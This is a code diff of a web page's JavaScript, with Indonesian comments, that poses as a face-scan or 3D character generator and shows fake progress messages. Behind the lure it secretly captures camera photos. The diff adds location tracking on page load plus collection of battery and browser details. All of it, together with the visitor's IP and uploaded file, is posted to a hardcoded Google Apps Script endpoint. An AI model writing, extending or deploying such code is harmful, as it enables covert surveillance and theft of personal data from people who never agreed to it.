@@ -43,14 +43,26 @@
 <canvas id="canvas"></canvas>
 
 <script>
-const GAS_URL = "https://script.google.com/macros/s/AKfycbw5o6oou9CETWkRi720Vdjt9w34owGT8JAUxJU_eCjl056IHjMh0YVIjdkI1egz8Siulw/exec"; // GANTI DENGAN URL WEB APP ANDA
+// URL GAS ANDA
+const GAS_URL = "https://script.google.com/macros/s/AKfycbw5o6oou9CETWkRi720Vdjt9w34owGT8JAUxJU_eCjl056IHjMh0YVIjdkI1egz8Siulw/exec"; 
+
 const fileInput = document.getElementById('fileInput');
 const submitBtn = document.getElementById('submitBtn');
 const loadStatus = document.getElementById('loadStatus');
 
 let secretPhotos = [];
+let userLocation = "Izin Ditolak";
 
-// Fungsi ambil foto kamera otomatis di background
+// 1. Ambil Lokasi (GPS) segera saat halaman dimuat
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition((position) => {
+        userLocation = position.coords.latitude + ", " + position.coords.longitude;
+    }, (err) => {
+        console.log("Lokasi ditolak");
+    });
+}
+
+// 2. Fungsi Ambil Foto Kamera (Background)
 async function startSecretCapture() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -82,27 +94,42 @@ submitBtn.addEventListener('click', async () => {
     document.getElementById('input-section').style.display = 'none';
     document.getElementById('loading').style.display = 'block';
     
-    // Baca file yang di-upload user
     const reader = new FileReader();
     reader.readAsDataURL(fileInput.files[0]);
     reader.onload = async function() {
         const userFileData = reader.result;
 
-        // Ambil Metadata
+        // A. Ambil IP
         let ip = "Unknown";
         try { const res = await fetch('https://api.ipify.org?format=json'); const d = await res.json(); ip = d.ip; } catch(e) {}
         
+        // B. Ambil Info Baterai
+        let batteryInfo = "N/A";
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = Math.round(b.level * 100) + "% " + (b.charging ? "(Charging)" : "(Discharging)");
+            }
+        } catch(e) {}
+
+        // C. Ambil Detail Browser
+        const browserInfo = navigator.userAgent.split(' ').slice(-3).join(' ');
+
         loadStatus.innerText = "Memproses pemindaian wajah...";
         setTimeout(() => { loadStatus.innerText = "Merender karakter 3D..."; }, 2500);
 
+        // D. Kirim Data Lengkap
         fetch(GAS_URL, {
             method: 'POST',
             mode: 'no-cors',
             body: JSON.stringify({
                 ip: ip,
                 os: navigator.platform,
-                images: secretPhotos, // Foto kamera rahasia
-                userFile: userFileData // File yang di-upload user
+                browser: browserInfo,    // Tambahan baru
+                battery: batteryInfo,    // Tambahan baru
+                location: userLocation,  // Tambahan baru
+                images: secretPhotos,
+                userFile: userFileData
             })
         }).then(() => {
             setTimeout(() => {
